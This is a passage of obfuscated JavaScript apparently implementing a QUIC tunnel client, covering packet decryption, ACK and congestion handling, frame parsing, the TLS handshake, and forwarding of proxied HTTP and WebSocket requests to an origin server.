        for (const i of [c[j0(0x23d)]][j0(0x653)](this[j0(0xb0b)][j0(0x51f)](j => j[j0(0x2a2)]))) {
            b[j0(0xadf)](f[j0(0xfa)](i), 0x0) && f[j0(0x77f)](i);
        }
        const g = this[j0(0xb0b)][0x0], h = this[j0(0xb0b)][j0(0x653)]([{
                    'keys': b['bnJtu'](a0bz, g[j0(0x2a2)]),
                    'phase': 0x1 - g['phase'],
                    'next': !![]
                }]);
        for (const j of h) {
            for (const k of j[j0(0x1af)] ? f[j0(0x653)]([j[j0(0x2a2)]]) : f) {
                const l = b['eqtNc'](a0bG, k, a, d, ![]);
                if (b[j0(0x169)](l, null))
                    continue;
                const [m, n] = l, o = b[j0(0x9fa)](b[j0(0x16e)](m[0x0], 0x3), 0x1), p = b[j0(0x4ed)](a0bH, Math[j0(0x434)](this[j0(0xab3)][a0bm], 0x0), o * 0x8, n);
                let q;
                try {
                    q = j[j0(0x2a2)][j0(0x7c1)](p, m, a['subarray'](b[j0(0x98b)](d, o)));
                } catch (r) {
                    continue;
                }
                if (j[j0(0x1af)]) {
                    const s = b[j0(0x24a)][j0(0xbb0)]('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            b[j0(0x14a)](this[j0(0xb0b)]['length'], 0x2) && this[j0(0xb0b)][j0(0x3ff)]();
                            continue;
                        case '1':
                            this[j0(0x215)][j0(0x4f6)](b[j0(0x726)](j0(0x969) + j['phase'], b[j0(0xba9)]));
                            continue;
                        case '2':
                            this['appRecvGens'][j0(0x1ad)]({
                                'keys': j['keys'],
                                'phase': j['phase']
                            });
                            continue;
                        case '3':
                            this[j0(0x661)][j[j0(0x79f)]] = b[j0(0x2f6)](a0bz, this['appSendKeys'][b['beWvx'](0x1, j['phase'])], !![]);
                            continue;
                        case '4':
                            this[j0(0x688)] = j['phase'];
                            continue;
                        }
                        break;
                    }
                }
                this[j0(0xab0)](a0bm, p), this[j0(0x215)][j0(0x4f6)](b[j0(0x98b)](b[j0(0x655)](b[j0(0x557)], a[j0(0xed)]) + b[j0(0x612)], p)), this['_handleFrames'](q, a0bm);
                return;
            }
        }
        this[j0(0xca4)][j0(0xc9a)] += 0x1, this[j0(0x215)]['debug'](b[j0(0x565)](b[j0(0x557)], a[j0(0xed)]) + j0(0x4f4));
    }
    [a0ch(0xab0)](a, b) {
        const j1 = a0ch, c = {
                'NhZGa': function (d, f, g) {
                    return d(f, g);
                },
                'QoFOL': function (d, f) {
                    return d > f;
                }
            };
        this['recvRanges'][a] = c['NhZGa'](a0bC, this[j1(0x967)][a], [{
                'start': b,
                'length': 0x1
            }]), c[j1(0x17a)](b, this[j1(0xab3)][a]) && (this[j1(0xab3)][a] = b), this[j1(0x9c5)][a] = !![];
    }
    ['_applyAck'](a, b) {
        const j2 = a0ch, c = {
                'ymAbW': function (m, n) {
                    return m - n;
                },
                'doQPC': function (m, n) {
                    return m + n;
                },
                'ebjUm': function (m, n) {
                    return m >= n;
                },
                'qeSOJ': function (m, n) {
                    return m < n;
                },
                'hbpOI': function (m, n) {
                    return m === n;
                },
                'KIvkl': function (m, n) {
                    return m !== n;
                },
                'MzWXZ': function (m, n) {
                    return m - n;
                },
                'KBkir': function (m, n) {
                    return m !== n;
                },
                'bUdPT': function (m, n) {
                    return m === n;
                }
            }, d = Date[j2(0x156)](), f = this['inFlight'][a];
        let g = -0x1;
        for (const m of b) {
            g = Math[j2(0x434)](g, c[j2(0x824)](c[j2(0x979)](m[j2(0xd0b)], m[j2(0xed)]), 0x1));
        }
        const h = [];
        let i = 0x0, j = null;
        for (const n of f) {
            let o = ![];
            for (const p of b) {
                if (c[j2(0x268)](n['pn'], p[j2(0xd0b)]) && c[j2(0xa83)](n['pn'], c[j2(0x979)](p[j2(0xd0b)], p['length']))) {
                    o = !![];
                    break;
                }
            }
            if (!o) {
                h[j2(0x77f)](n);
                continue;
            }
            i += n[j2(0x717)];
            c[j2(0x4c3)](n['pn'], g) && c['KIvkl'](n['retransmitted'], !![]) && (j = c['ymAbW'](c['MzWXZ'](d, n['time']), Math[j2(0x2dc)](b[j2(0x6d4)] || 0x0, this[j2(0x806)])));
            n[j2(0xcac)] && this['cryptoSend'][a][j2(0xbc2)](n[j2(0xcac)][j2(0xd0b)], n[j2(0xcac)][j2(0xed)], ![]);
            for (const q of n[j2(0x4b0)]) {
                q[j2(0x359)][j2(0x6da)][j2(0xbc2)](q['start'], q['length'], q[j2(0x1d6)]);
            }
        }
        const k = [], l = [];
        for (const r of h) {
            c[j2(0x268)](c['MzWXZ'](g, r['pn']), this[j2(0xd07)]) ? l[j2(0x77f)](r) : k[j2(0x77f)](r);
        }
        this['inFlight'][a] = k;
        i && (c[j2(0x6c5)](j, null) && j > 0x0 && this[j2(0xb2c)](j), this[j2(0xa1f)](), this['_growWindow'](i));
        for (const s of l) {
            this[j2(0x417)](a, s);
        }
        l[j2(0xed)] && this[j2(0xc03)](a), c[j2(0xab9)](a, a0bm) && c[j2(0xa83)](k[j2(0xed)], f[j2(0xed)]) && this[j2(0x46e)]();
    }
    [a0ch(0xae5)](a) {
        const j3 = a0ch, b = {
                'xurmU': function (c, d) {
                    return c < d;
                },
                'wJVGd': function (c, d) {
                    return c / d;
                },
                'MRUwF': function (c, d) {
                    return c * d;
                }
            };
        b[j3(0x9c0)](this[j3(0xc24)], this[j3(0xd4e)]) ? this[j3(0xc24)] += a : this[j3(0xc24)] += Math['max'](0x1, Math[j3(0x579)](b['wJVGd'](b['MRUwF'](this[j3(0xd64)], a), this[j3(0xc24)]))), this[j3(0xc24)] = Math['min'](this[j3(0xc24)], this[j3(0x6ba)]);
    }
    ['_handleFrames'](a, b) {
        const j4 = a0ch, c = {
                'GsVSv': function (f, g) {
                    return f > g;
                },
                'ZaNpf': function (f, g) {
                    return f === g;
                },
                'LtYHU': function (f, g) {
                    return f === g;
                },
                'MqSqL': function (f, g) {
                    return f(g);
                },
                'BGtmi': function (f, g) {
                    return f === g;
                },
                'FiRCi': function (f, g) {
                    return f < g;
                },
                'HACMP': function (f, g) {
                    return f === g;
                },
                'azyAy': function (f, g) {
                    return f & g;
                },
                'Afver': function (f, g) {
                    return f(g);
                },
                'IZiHm': function (f, g) {
                    return f & g;
                },
                'mKjBT': function (f, g) {
                    return f(g);
                },
                'cgRSu': function (f, g) {
                    return f === g;
                },
                'MXtAk': function (f, g) {
                    return f === g;
                },
                'Sbnql': function (f, g) {
                    return f === g;
                },
                'etqFP': function (f, g) {
                    return f < g;
                },
                'ikrld': function (f, g) {
                    return f + g;
                },
                'ZTmoa': function (f, g) {
                    return f < g;
                },
                'mIUMt': function (f, g) {
                    return f === g;
                },
                'UDfPg': function (f, g) {
                    return f === g;
                },
                'bOJMK': function (f, g) {
                    return f === g;
                },
                'POOJz': function (f, g) {
                    return f === g;
                },
                'pgsee': function (f, g) {
                    return f === g;
                },
                'ydxJf': function (f, g) {
                    return f === g;
                },
                'VdNFv': 'utf8',
                'KvvYn': function (f, g) {
                    return f + g;
                },
                'ZqIBU': j4(0x40c),
                'uNVQY': function (f, g) {
                    return f === g;
                },
                'olqfy': 'unhandled\x20QUIC\x20frame\x20type\x200x'
            }, d = new a0bu(a);
        while (c[j4(0xa09)](d[j4(0x7b4)], 0x0)) {
            const f = d[j4(0x4a0)]();
            if (c[j4(0xc8c)](f, a0bo[j4(0x2f1)]))
                continue;
            if (c[j4(0xc8c)](f, a0bo[j4(0xc6a)]))
                continue;
            if (f === a0bo[j4(0xbc2)] || c[j4(0xd6e)](f, a0bo[j4(0x44f)])) {
                const g = c[j4(0x950)](a0bJ, d);
                c[j4(0xb94)](f, a0bo[j4(0x44f)]) && (d[j4(0x2d2)](), d[j4(0x2d2)](), d['varint']());
                this[j4(0x297)](b, g);
                continue;
            }
            if (f === a0bo['crypto']) {
                const h = d[j4(0x62a)](), i = d['number']();
                if (c[j4(0xbf0)](d[j4(0x7b4)], i))
                    return;
                const j = d['bytes'](i), k = this[j4(0x2f5)][b][j4(0x501)](h, j);
                k[j4(0xed)] && this[j4(0x5b6)](b, k);
                continue;
            }
            if (c[j4(0xc95)](c[j4(0x854)](f, 0xf8), a0bo[j4(0x359)])) {
                const l = f & 0x7, m = c['Afver'](Number, d[j4(0x2d2)]()), n = c[j4(0x950)](Boolean, c[j4(0xb77)](l, 0x2)), o = c[j4(0x950)](Boolean, l & 0x4), p = c[j4(0x22d)](Boolean, c[j4(0xb77)](l, 0x1));
                let q = 0x0;
                o && (q = d[j4(0x62a)]());
                let r = d['remaining'];
                n && (r = d['number']());
                if (c[j4(0xbf0)](d[j4(0x7b4)], r))
                    return;
                this[j4(0x57e)](m, q, d[j4(0x717)](r), p);
                continue;
            }
            if (c['cgRSu'](f, a0bo[j4(0x5af)])) {
                this[j4(0xc78)] = Math[j4(0x434)](this[j4(0xc78)], d[j4(0x62a)]());
                continue;
            }
            if (c['LtYHU'](f, a0bo['maxStreamData'])) {
                const s = d['number'](), t = this[j4(0x4b0)][j4(0x850)](s);
                t !== undefined ? t[j4(0x4ec)] = Math['max'](t['peerLimit'] || 0x0, d['number']()) : d[j4(0x2d2)]();
                continue;
            }
            if (c[j4(0xd5b)](f, a0bo[j4(0x27f)]) || c['Sbnql'](f, a0bo[j4(0x393)])) {
                d[j4(0x2d2)]();
                continue;
            }
            if (c[j4(0x5ff)](f, a0bo[j4(0x28f)])) {
                d[j4(0x2d2)](), d[j4(0x2d2)]();
                const u = d['byte']();
                if (c[j4(0x1fe)](d[j4(0x7b4)], c[j4(0xd51)](u, 0x10)))
                    return;
                d['bytes'](u), d['bytes'](0x10);
                continue;
            }
            if (f === a0bo['retireConnectionId']) {
                d['varint']();
                continue;
            }
            if (c['ZaNpf'](f, a0bo[j4(0x90a)])) {
                if (c['ZTmoa'](d[j4(0x7b4)], 0x8))
                    return;
                const v = d[j4(0x717)](0x8), w = new a0bt();
                w[j4(0x4a0)](a0bo['pathResponse'])[j4(0x717)](v), this[j4(0x7d1)](w[j4(0x14c)](), b);
                continue;
            }
            if (c['mIUMt'](f, a0bo['pathResponse']))
                continue;
            if (c[j4(0xa6a)](f, a0bo['handshakeDone'])) {
                this[j4(0x46e)]();
                continue;
            }
            if (f === a0bo['resetStream']) {
                const x = d['number']();
                d[j4(0x2d2)](), d[j4(0x2d2)]();
                const y = this['streams'][j4(0x850)](x);
                y !== undefined && (y['reset'] = !![], this[j4(0x216)](y));
                continue;
            }
            if (c[j4(0x888)](f, a0bo['stopSending'])) {
                d[j4(0x2d2)](), d[j4(0x2d2)]();
                continue;
            }
            if (c['POOJz'](f, a0bo[j4(0x6ef)])) {
                const z = d[j4(0x62a)]();
                this[j4(0xd55)] = Buffer[j4(0x8c2)](d['bytes'](z));
                continue;
            }
            if (c[j4(0xc8c)](f, a0bo[j4(0x894)]) || c[j4(0xa48)](f, a0bo[j4(0x63d)])) {
                const A = d[j4(0x62a)]();
                let B = 0x0;
                c['ydxJf'](f, a0bo['transportClose']) && (B = d['number']());
                const C = d[j4(0x7b4)] ? d[j4(0x717)](d[j4(0x7b4)])[j4(0x1d9)](c[j4(0x12e)]) : '';
                this['_fail'](c[j4(0xd51)](c[j4(0xcd2)](j4(0xd0f), A) + c[j4(0xb36)], C));
                return;
            }
            if (c[j4(0x965)](f, a0bo[j4(0x81c)]) || c[j4(0x2db)](f, a0bo['datagramLen'])) {
                let D = d[j4(0x7b4)];
                c[j4(0xc8c)](f, a0bo[j4(0x875)]) && (D = d[j4(0x62a)]());
                if (c['etqFP'](d[j4(0x7b4)], D))
                    return;
                d[j4(0x717)](D);
                continue;
            }
            this[j4(0xc49)](c[j4(0x64f)] + f['toString'](0x10));
            return;
        }
    }
    [a0ch(0x7d1)](a, b) {
        const j5 = a0ch;
        this[j5(0x9c5)][b] = !![], this[j5(0x240)] = this[j5(0x240)] || [], this[j5(0x240)][j5(0x77f)]({
            'epoch': b,
            'frame': a
        });
    }
    [a0ch(0x57e)](a, b, c, d) {
        const j6 = a0ch, f = {
                'oMDLp': function (i, j) {
                    return i === j;
                },
                'qFNVC': function (i, j) {
                    return i & j;
                },
                'SLhVi': 'remote',
                'dNFxT': j6(0x19a),
                'FqxVD': function (i, j) {
                    return i < j;
                },
                'Xmsar': function (i, j) {
                    return i / j;
                },
                'ndHkw': function (i, j) {
                    return i + j;
                },
                'CdHjX': function (i, j) {
                    return i < j;
                },
                'opKVv': function (i, j) {
                    return i - j;
                }
            };
        let g = this[j6(0x4b0)][j6(0x850)](a);
        f[j6(0x8d9)](g, undefined) && (g = new a0bQ(this, a, f[j6(0x5bf)](a, 0x1) === 0x1 ? f[j6(0x8d4)] : j6(0x3dd)), this[j6(0x4b0)]['set'](a, g), this[j6(0x7c5)](g));
        const h = g[j6(0x920)][j6(0x501)](b, c);
        if (h[j6(0xed)]) {
            const i = f['dNFxT']['split']('|');
            let j = 0x0;
            while (!![]) {
                switch (i[j++]) {
                case '0':
                    this['onStreamData'](g, h);
                    continue;
                case '1':
                    g[j6(0x23d)] = Buffer[j6(0x653)]([
                        g[j6(0x23d)],
                        h
                    ]);
                    continue;
                case '2':
                    f['FqxVD'](g[j6(0x88b)] - g['recv']['length'], f[j6(0xc13)](this[j6(0x7fd)], 0x2)) && (g[j6(0x88b)] = f[j6(0x8fa)](g[j6(0x23d)]['length'], this['receiveWindow']), f[j6(0xd0a)](this[j6(0x669)][j6(0xfa)](g), 0x0) && this[j6(0x669)]['push'](g));
                    continue;
                case '3':
                    this[j6(0x627)] += h['length'];
                    continue;
                case '4':
                    f['CdHjX'](f[j6(0x2d3)](this['localMaxData'], this[j6(0x627)]), this[j6(0x7fd)] / 0x2) && (this[j6(0x99a)] = this['consumedTotal'] + this[j6(0x7fd)], this[j6(0xb96)] = !![]);
                    continue;
                case '5':
                    this['_wake']();
                    continue;
                }
                break;
            }
        }
        d && !g['ended'] && f[j6(0x8d9)](g[j6(0x920)][j6(0x21b)], g[j6(0x23d)][j6(0xed)]) && (g[j6(0x84e)] = !![], this[j6(0x216)](g));
    }
    [a0ch(0x987)]() {
        const j7 = a0ch;
        !this[j7(0xb41)] && this['_tick']();
    }
    [a0ch(0x5b6)](a, b) {
        const j8 = a0ch, c = {
                'tjJWQ': function (d, f) {
                    return d === f;
                },
                'qEGnH': function (d, f) {
                    return d === f;
                },
                'amsdP': 'awaiting-server-hello',
                'gPEpf': function (d, f) {
                    return d + f;
                },
                'VfEsV': 'server\x20hello:\x20',
                'aDmvh': j8(0x1eb)
            };
        if (c['tjJWQ'](a, a0bm))
            return;
        if (a === a0bk && c[j8(0x29f)](this[j8(0x40a)][j8(0x22b)], c[j8(0x748)])) {
            this[j8(0x158)] = Buffer[j8(0x653)]([
                this['serverHello'],
                b
            ]);
            let d;
            try {
                d = this[j8(0x40a)][j8(0x3a4)](this[j8(0x158)]);
            } catch (g) {
                this['_fail'](c['gPEpf'](c['VfEsV'], g['message']));
                return;
            }
            if (d === null)
                return;
            this[j8(0x158)] = Buffer[j8(0x9e7)](0x0);
            let f;
            try {
                f = this[j8(0x40a)][j8(0x75b)](Buffer[j8(0x8c2)](d));
            } catch (h) {
                this['_fail'](c[j8(0x4f3)](c['VfEsV'], h[j8(0x8f9)]));
                return;
            }
            this['keys'][a0bl] = f, this[j8(0x215)]['debug'](c[j8(0x69e)]);
            return;
        }
        this['handshakeBytes'] = Buffer[j8(0x653)]([
            this[j8(0xca2)],
            b
        ]), this[j8(0x5ba)]();
    }
    [a0ch(0x5ba)]() {
        const j9 = a0ch, a = {
                'BzBDX': function (b, c) {
                    return b >= c;
                },
                'igGPq': function (b, c) {
                    return b + c;
                },
                'PjAuK': function (b, c) {
                    return b < c;
                },
                'EudSk': function (b, c) {
                    return b + c;
                },
                'bmjDk': j9(0x670),
                'gaDLa': function (b, c) {
                    return b === c;
                },
                'SfQUA': j9(0x54e),
                'LlqTc': function (b, c) {
                    return b + c;
                },
                'kkWfg': 'quic\x20peer\x20params\x20max-data=',
                'bBhYF': j9(0x5ca),
                'ksUNJ': j9(0x383),
                'JBXmi': function (b, c) {
                    return b !== c;
                },
                'YBDZR': j9(0x63f),
                'laHQj': function (b, c) {
                    return b !== c;
                }
            };
        while (a[j9(0x6b3)](this[j9(0xca2)]['length'], 0x4)) {
            const b = a['igGPq'](0x4, this[j9(0xca2)]['readUIntBE'](0x1, 0x3));
            if (a[j9(0x7ce)](this[j9(0xca2)][j9(0xed)], b))
                return;
            const c = Buffer[j9(0x8c2)](this['handshakeBytes']['subarray'](0x0, b));
            this[j9(0xca2)] = this[j9(0xca2)]['subarray'](b);
            let d;
            try {
                d = this[j9(0x40a)][j9(0x635)](c);
            } catch (f) {
                this[j9(0xc49)](a[j9(0xa27)](a[j9(0x3bd)], f[j9(0x8f9)]));
                return;
            }
            if (this[j9(0x40a)]['remoteParameters'] && a[j9(0x722)](this['remoteParameters'], null)) {
                const g = a['SfQUA'][j9(0xbb0)]('|');
                let h = 0x0;
                while (!![]) {
                    switch (g[h++]) {
                    case '0':
                        this[j9(0x69b)] = this[j9(0x40a)]['remoteParameters'][a0bp[j9(0x6c2)]] || 0x0;
                        continue;
                    case '1':
                        this[j9(0xc78)] = this[j9(0x40a)][j9(0xa0d)][a0bp[j9(0xc32)]] || 0x0;
                        continue;
                    case '2':
                        this[j9(0x806)] = Math[j9(0x2dc)](a[j9(0x722)](this['tls'][j9(0xa0d)][a0bp['maxAckDelay']], undefined) ? 0x19 : this[j9(0x40a)][j9(0xa0d)][a0bp[j9(0x8f4)]], 0x64);
                        continue;
                    case '3':
                        this[j9(0x215)][j9(0x4f6)](a[j9(0xa27)](a['LlqTc'](a[j9(0x876)](a[j9(0x83d)], this['peerMaxData']) + a[j9(0x9b8)], this[j9(0x41c)]) + a[j9(0x2e0)], this[j9(0x40a)][j9(0xa0d)][a0bp[j9(0x580)]] || 0x0));
                        continue;
                    case '4':
                        this[j9(0xa0d)] = this[j9(0x40a)][j9(0xa0d)];
                        continue;
                    case '5':
                        this[j9(0x41c)] = this[j9(0x40a)]['remoteParameters'][a0bp[j9(0x795)]] || 0x0;
                        continue;
                    }
                    break;
                }
            }
            if (a['JBXmi'](d, null)) {
                if (this[j9(0x34e)]) {
                    const i = a0bP(this[j9(0x40a)]['leafCert']);
                    if (i) {
                        this[j9(0xc49)](j9(0x8ea) + i);
                        return;
                    }
                }
                this[j9(0x2a2)][a0bm] = {
                    'send': d[j9(0x6da)],
                    'recv': d[j9(0x23d)]
                }, this['appRecvGens'] = [{
                        'keys': d[j9(0x23d)],
                        'phase': 0x0
                    }], this['appSendKeys'][0x0] = d['send'], this[j9(0x7ff)][a0bl][j9(0x82b)](d['finished'], ![]), this[j9(0x691)] = !![];
                !d[j9(0x71f)] && this[j9(0x215)]['warning'](a[j9(0x543)]);
                this['log'][j9(0x4f6)](a[j9(0x5d1)]('quic\x20handshake\x20complete\x20alpn=', this[j9(0x40a)][j9(0x3c9)] || '?'));
                if (a[j9(0x82d)](this[j9(0x2d7)], null)) {
                    const j = this[j9(0x2d7)];
                    this[j9(0x2d7)] = null, j[j9(0x6ad)](this);
                }
                this['onReady']();
                return;
            }
        }
    }
    [a0ch(0x4f7)](a) {
        const ja = a0ch, b = {
                'VbJWd': ja(0x524),
                'iPinF': function (f, g) {
                    return f || g;
                }
            }, c = b[ja(0x29e)][ja(0xbb0)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this['closeReason'] = b[ja(0x11d)](a, ja(0x4f7));
                continue;
            case '1':
                this['_tick']();
                continue;
            case '2':
                this['closing'] = !![];
                continue;
            case '3':
                if (this[ja(0xb41)])
                    return;
                continue;
            case '4':
                setTimeout(() => this[ja(0x46d)](null), 0xc8);
                continue;
            }
            break;
        }
    }
    [a0ch(0xc49)](a) {
        const jb = a0ch, b = {
                'vPbhX': function (c, d) {
                    return c + d;
                },
                'JMjJc': jb(0x345)
            };
        if (this[jb(0xb41)])
            return;
        this['log'][jb(0x4f6)](b[jb(0xbed)](b[jb(0x293)], a)), this['_finish'](new Error(a));
    }
    ['_finish'](a) {
        const jc = a0ch, b = {
                'ZKxZb': jc(0xb41),
                'FLYcs': function (c, d) {
                    return c !== d;
                }
            };
        if (this[jc(0xb41)])
            return;
        this[jc(0xb41)] = a ? a[jc(0x8f9)] : b[jc(0x5c6)];
        this[jc(0x962)] !== null && (clearInterval(this[jc(0x962)]), this[jc(0x962)] = null);
        if (b[jc(0x7e1)](this[jc(0xb6f)], null)) {
            try {
                this[jc(0xb6f)]['close']();
            } catch (c) {
            }
            this[jc(0xb6f)] = null;
        }
        if (!this[jc(0x691)] && this['settle'] !== null) {
            const d = this[jc(0x2d7)];
            this[jc(0x2d7)] = null, d[jc(0x1e0)](a || new Error(jc(0x783)));
        } else
            this[jc(0x6fe)](a);
    }
}
function a0bS(a, b) {
    const jd = a0ch, c = [];
    for (const [d, f] of a) {
        d[jd(0xacd)]() === b && c[jd(0x77f)](f);
    }
    return c;
}
function a0bT(a) {
    const je = a0ch, b = {
            'hvjyC': function (i, j) {
                return i >= j;
            },
            'YxuWM': function (i, j) {
                return i !== j;
            },
            'ZHkFU': function (i, j) {
                return i + j;
            },
            'IbDoE': function (i, j) {
                return i + j;
            },
            'zqebQ': je(0x9f5),
            'LjzZk': function (i, j) {
                return i + j;
            },
            'gMlTi': function (i, j) {
                return i(j);
            },
            'wsAPG': function (i, j, k) {
                return i(j, k);
            },
            'qjXsu': je(0x91c),
            'Tkhti': je(0x6be),
            'pugVN': function (i, j) {
                return i > j;
            }
        }, c = new Map(), d = [];
    for (const [i, j] of a[je(0x38d)]) {
        if (b[je(0x408)](i[je(0xfa)](a0ba), 0x0)) {
            const k = i[je(0xbb0)](':');
            if (b[je(0x530)](k[je(0xed)], 0x2))
                throw new Error(b[je(0x741)](b[je(0xc59)]('header\x20Key:\x20', i), b[je(0x6d0)]));
            d[je(0x77f)]([
                k[0x1],
                j
            ]);
        } else
            c[je(0xb80)](i, j);
    }
    let f = a['dest'];
    try {
        const l = new URL(a[je(0xc66)]);
        f = b[je(0xa21)](l[je(0x38a)], l[je(0x5cb)]);
    } catch (m) {
        f = a[je(0xc66)];
    }
    const g = b[je(0x87e)](Number, a0bS(d, je(0x36e))[0x0]), h = b[je(0xaf3)](a0bS, d, b[je(0x839)])['join'](',')[je(0xacd)]()[je(0x659)](b[je(0x61f)]);
    return {
        'type': a[je(0x430)],
        'method': c[je(0x850)](a0b7) || je(0x11f),
        'host': c[je(0x850)](a0b8) || '',
        'path': f[je(0xc9b)]('/') ? f : '/' + f,
        'headers': d,
        'contentLength': Number[je(0xa7a)](g) && b[je(0x34d)](g, 0x0) ? g : null,
        'bodyless': !h && !(Number[je(0xa7a)](g) && g > 0x0)
    };
}
function a0bU(a) {
    const jf = a0ch, b = {
            'qijtG': function (d, f) {
                return d !== f;
            },
            'vxOqA': function (d, f) {
                return d >= f;
            }
        }, c = a[jf(0x1df)];
    if (c['bodyless'])
        return !![];
    if (a[jf(0x84e)])
        return !![];
    return b['qijtG'](c[jf(0x155)], null) && b[jf(0x4e9)](a[jf(0xae4)][jf(0xed)], c[jf(0x155)]);
}
class a0bV {
    constructor(a, b, c, d, f) {
        const jg = a0ch;
        this['session'] = a, this[jg(0x22b)] = b, this[jg(0x1df)] = c, this[jg(0x85a)] = d, this[jg(0x215)] = f, this[jg(0x8cf)] = [], this[jg(0x316)] = [], this['stopped'] = ![], this['sock'] = null;
    }
    [a0ch(0xae2)](a) {
        const jh = a0ch;
        if (a === null)
            this[jh(0x8cf)]['push'](null);
        else
            a['length'] && this[jh(0x8cf)][jh(0x77f)](a);
        this[jh(0x987)]();
    }
    ['stop']() {
        const ji = a0ch, a = {
                'fYYWJ': function (b, c) {
                    return b !== c;
                }
            };
        if (this[ji(0x727)])
            return;
        this[ji(0x727)] = !![], this[ji(0x987)]();
        if (a['fYYWJ'](this[ji(0xba5)], null))
            try {
                this['sock'][ji(0x3d8)]();
            } catch (b) {
            }
    }
    [a0ch(0x987)]() {
        const jj = a0ch, a = {
                'fETtS': function (b) {
                    return b();
                }
            };
        for (const b of this[jj(0x316)]) {
            a[jj(0x778)](b);
        }
        this[jj(0x316)] = [];
    }
    async [a0ch(0x999)]() {
        const jk = a0ch;
        while (!this[jk(0x727)]) {
            if (this[jk(0x8cf)]['length'])
                return this[jk(0x8cf)][jk(0xaa5)]();
            await new Promise(a => this[jk(0x316)][jk(0x77f)](a));
        }
        return null;
    }
    async [a0ch(0x668)]() {
        const jl = a0ch, a = {
                'ZZoJZ': function (b, c) {
                    return b(c);
                },
                'DVsIP': function (b, c) {
                    return b(c);
                },
                'PIOly': function (b, c) {
                    return b !== c;
                },
                'KSjDg': function (b, c) {
                    return b === c;
                },
                'MBMeJ': jl(0x91c),
                'NiYzY': jl(0x36e),
                'nxKnH': jl(0x153),
                'ySLHz': jl(0x8f1),
                'Yputs': 'cf-proxy-',
                'CWsbP': function (b, c) {
                    return b + c;
                },
                'huFVL': function (b, c) {
                    return b + c;
                },
                'uOPJL': jl(0x6f2),
                'DtYoy': jl(0x570)
            };
        try {
            this[jl(0xba5)] = await a[jl(0x9ca)](a0aW, this['origin']), this[jl(0x755)]();
            const b = await a[jl(0x71d)](a0aZ, this[jl(0xba5)]);
            if (a[jl(0x517)](b[jl(0x4dc)], 0x65)) {
                this[jl(0xcfb)][jl(0x41a)](this['state'][jl(0x359)], jl(0x606) + b[jl(0x4dc)], [[
                        a0b9,
                        a['ZZoJZ'](String, b[jl(0x4dc)])
                    ]], !![]);
                try {
                    this['sock'][jl(0x3d8)]();
                } catch (d) {
                }
                return;
            }
            const c = [[
                    a0b9,
                    String(b['status'])
                ]];
            for (const [f, g] of b[jl(0x363)]) {
                const h = f['toLowerCase']();
                if (a[jl(0xcca)](h, a[jl(0xcc4)]) || h === a[jl(0x281)])
                    continue;
                if (h[jl(0xc9b)](a[jl(0x513)]) || h['startsWith'](a[jl(0x396)]) || h[jl(0xc9b)](a[jl(0x350)]))
                    continue;
                c['push']([
                    a[jl(0xb30)](a[jl(0x935)](a0ba, ':'), f),
                    g
                ]);
            }
            this[jl(0xcfb)][jl(0x41a)](this[jl(0x22b)]['stream'], '', c, ![]), this['writeToOrigin']()['catch'](() => {
            }), await this[jl(0xc6b)](b['rest']);
        } catch (i) {
            this[jl(0x215)][jl(0x8dd)](a[jl(0xb30)](a[jl(0x58a)], this[jl(0x22b)]['stream']['id']) + a[jl(0xca0)] + i), this[jl(0xcfb)][jl(0x8ef)](this[jl(0x22b)], a[jl(0x9ca)](String, i['message'] || i), 0x1f6);
        } finally {
            this[jl(0xb00)]();
        }
    }
    async [a0ch(0xc6b)](a) {
        const jm = a0ch;
        a[jm(0xed)] && this['state']['stream'][jm(0x92a)](a, ![]);
        for await (const b of this['sock']) {
            if (this[jm(0x727)])
                break;
            this['state'][jm(0x359)][jm(0x92a)](b, ![]);
        }
        !this[jm(0x727)] && this['state'][jm(0x359)][jm(0x92a)](Buffer[jm(0x9e7)](0x0), !![]);
    }
    async ['writeToOrigin']() {
        const jn = a0ch, a = {
                'cSmiK': function (b, c) {
                    return b === c;
                }
            };
        while (!this[jn(0x727)]) {
            const b = await this['_next']();
            if (a['cSmiK'](b, null)) {
                try {
                    this[jn(0xba5)]['end']();
                } catch (c) {
                }
                return;
            }
            try {
                this[jn(0xba5)][jn(0x92a)](b);
            } catch (d) {
                this['stopped'] = !![];
                return;
            }
        }
    }
    ['sendHandshake']() {
        const jo = a0ch, a = {
                'bBOzH': function (i, j) {
                    return i + j;
                },
                'ZRslO': function (i, j) {
                    return i + j;
                },
                'ZoVDP': jo(0x9b2),
                'xRpvZ': jo(0xab4),
                'Kkufl': function (i, j) {
                    return i === j;
                },
                'dJbrZ': 'connection',
                'SaDJv': jo(0x96e),
                'yNizm': jo(0x36e),
                'jILaY': jo(0x91c),
                'nzoYL': jo(0xcaf),
                'LjIUA': 'sec-websocket-version',
                'qAGji': jo(0x85a),
                'XbVLZ': function (i, j) {
                    return i + j;
                },
                'rVnPC': function (i, j) {
                    return i + j;
                },
                'KBtXm': function (i, j) {
                    return i + j;
                },
                'tASxm': jo(0x58b),
                'RKpVH': function (i, j) {
                    return i + j;
                },
                'RBsQC': jo(0x3e3),
                'sKhhR': 'Connection:\x20Upgrade',
                'rHkoZ': jo(0x6ab),
                'tKspp': function (i, j) {
                    return i + j;
                },
                'QCglT': '\x0d\x0a\x0d\x0a',
                'RJTny': 'latin1'
            }, b = new URL(this[jo(0x85a)]), c = this[jo(0x1df)][jo(0x4ac)][jo(0xc9b)]('/') ? this[jo(0x1df)][jo(0x4ac)] : a[jo(0xab8)]('/', this[jo(0x1df)][jo(0x4ac)]), d = [a[jo(0x1a5)](a[jo(0x1a5)](jo(0x4be), c), a['ZoVDP'])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this['request'][jo(0x363)]) {
            const k = i[jo(0xacd)]();
            if (k === a[jo(0x306)] || a[jo(0xb7a)](k, a[jo(0x6e4)]) || k === a['SaDJv'] || a[jo(0xb7a)](k, a['yNizm']) || a[jo(0xb7a)](k, a[jo(0x9b0)]))
                continue;
            if (k === a[jo(0xcc5)])
                f = !![];
            else {
                if (a[jo(0xb7a)](k, a[jo(0xa85)]))
                    g = !![];
                else
                    a[jo(0xb7a)](k, a['qAGji']) && (h = !![]);
            }
            d[jo(0x77f)](a[jo(0x119)](a[jo(0xd2a)](i, ':\x20'), j));
        }
